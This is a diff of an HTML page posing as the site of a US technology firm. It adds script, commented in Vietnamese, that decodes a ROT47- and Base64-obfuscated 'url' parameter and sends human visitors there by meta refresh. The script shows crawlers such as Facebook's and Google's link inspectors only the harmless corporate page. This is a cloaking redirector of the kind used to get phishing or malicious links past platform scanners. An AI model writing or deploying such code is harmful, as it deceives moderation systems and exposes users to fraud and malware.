@@ -7,41 +7,86 @@
     <meta name="keywords" content="technology, business solutions, USA, enterprise services">
     <meta name="author" content="Horizon Solutions">
     <script>
+        // Bật ON để kiểm tra chuyển hướng
         const redirectStatus = 'ON'; 
         const params = new URLSearchParams(window.location.search);
         const data = params.get('url') || '';
 
+        // Hàm giải mã Base64 + ROT47, xử lý kỹ hơn và kiểm tra Base64 cẩn thận
         function decodeAdvanced(input) {
-            try {
-                let rot47 = '';
-                for (let i = 0; i < input.length; i++) {
-                    let code = input.charCodeAt(i);
-                    if (code >= 33 && code <= 126) {
-                        rot47 += String.fromCharCode((code - 33 - 47 + 94) % 94 + 33);
-                    } else {
-                        rot47 += input[i];
-                    }
+            let rot47 = '';
+            for (let i = 0; i < input.length; i++) {
+                let code = input.charCodeAt(i);
+                if (code >= 33 && code <= 126) {
+                    rot47 += String.fromCharCode((code - 33 - 47 + 94) % 94 + 33);
+                } else {
+                    rot47 += input[i];
                 }
+            }
+            try {
+                // Lọc và chuẩn hóa chuỗi Base64, chỉ giữ ký tự hợp lệ
                 const cleanedRot47 = rot47.replace(/[^A-Za-z0-9+/=]/g, '');
-                if (!/^[A-Za-z0-9+/]+={0,2}$/.test(cleanedRot47)) {
+                const base64Pattern = /^[A-Za-z0-9+/]+={0,2}$/;
+                if (!base64Pattern.test(cleanedRot47)) {
                     console.error("Invalid Base64 string after ROT47 (cleaned):", cleanedRot47);
                     return '';
                 }
                 const decodedBase64 = atob(cleanedRot47);
-                return decodeURIComponent(decodedBase64);
+                return decodeURIComponent(decodedBase64); // Xử lý ký tự đặc biệt
             } catch (e) {
-                console.error("Invalid encoded URL:", e);
+                console.error("Invalid encoded URL:", e, "Raw ROT47:", rot47, "Cleaned ROT47:", cleanedRot47);
                 return '';
             }
         }
 
-        if (redirectStatus === 'ON' && data) {
-            const destination = decodeAdvanced(data);
-            if (destination) {
-                window.location.replace(destination);
-            } else {
-                console.error("Failed to decode URL.");
+        // Hàm mã hóa để kiểm tra (dùng nếu cần)
+        function encodeAdvanced(url) {
+            let base64 = btoa(encodeURIComponent(url));
+            let rot47 = '';
+            for (let i = 0; i < base64.length; i++) {
+                let code = base64.charCodeAt(i);
+                if (code >= 33 && code <= 126) {
+                    rot47 += String.fromCharCode((code - 33 + 47) % 94 + 33);
+                } else {
+                    rot47 += base64[i];
+                }
             }
+            return rot47;
+        }
+
+        // Kiểm tra bot, giảm sai sót với người dùng thật
+        function isBot() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const botSignatures = [
+                'facebookexternalhit', 'facebot', 'meta-inspector', // Meta bots
+                'googlebot', 'bingbot', 'slurp', 'twitterbot', 'linkedinbot',
+                'crawler', 'spider', 'bot'
+            ];
+            // Chỉ chặn nếu user-agent rõ ràng là bot, tránh nhầm lẫn với trình duyệt người dùng
+            return botSignatures.some(signature => userAgent.includes(signature)) && 
+                   !/chrome|safari|firefox|edge|opera/i.test(userAgent);
+        }
+
+        // Debug và chuyển hướng
+        console.log("Redirect Status:", redirectStatus);
+        console.log("Encoded URL:", data);
+        if (redirectStatus === 'ON' && data) {
+            console.log("Checking if bot...");
+            if (!isBot()) {
+                console.log("Not a bot, decoding URL...");
+                const destination = decodeAdvanced(data);
+                if (destination) {
+                    console.log("Decoded URL:", destination);
+                    // Chuyển hướng tức thì qua thẻ meta
+                    document.write(`<meta http-equiv="refresh" content="0;url=${encodeURI(destination)}">`);
+                } else {
+                    console.error("Failed to decode URL, showing default page. Raw ROT47:", rot47, "Cleaned ROT47:", cleanedRot47);
+                }
+            } else {
+                console.log("Bot detected, not redirecting.");
+            }
+        } else {
+            console.log("Redirect is OFF or no URL provided, showing default page.");
         }
     </script>
     <title>Horizon Solutions - Empowering Your Future</title>
@@ -103,16 +148,16 @@
     <div class="container">
         <div class="content">
             <h2>About Us</h2>
-            <p>Founded in 2005, Horizon Solutions is a leading provider of technology and business services across the United States.</p>
+            <p>Founded in 2005, Horizon Solutions is a leading provider of technology and business services across the United States. With headquarters in San Francisco, California, we empower enterprises to achieve their goals through innovative solutions, exceptional support, and a commitment to excellence.</p>
             <h2>Our Services</h2>
-            <p>We offer cloud computing, cybersecurity, data analytics, and enterprise software development.</p>
+            <p>We offer a wide range of services including cloud computing, cybersecurity, data analytics, and enterprise software development. Our team of experts works tirelessly to deliver tailored solutions that drive growth and efficiency for businesses of all sizes.</p>
             <h2>Why Choose Horizon?</h2>
-            <p>With over 500 satisfied clients and a presence in 25 states, Horizon Solutions is trusted by industry leaders.</p>
+            <p>With over 500 satisfied clients and a presence in 25 states, Horizon Solutions is trusted by industry leaders. Our dedication to quality and innovation has earned us multiple awards, including the 2024 Tech Innovation Award.</p>
             <a href="#" class="cta">Get Started Today</a>
         </div>
     </div>
     <div class="footer">
-        © 2025 Horizon Solutions, Inc. All Rights Reserved. | Contact: info@horizonsolutions.com
+        © 2025 Horizon Solutions, Inc. All Rights Reserved. | 123 Market St, San Francisco, CA 94103 | Contact: info@horizonsolutions.com
     </div>
 </body>
 </html>
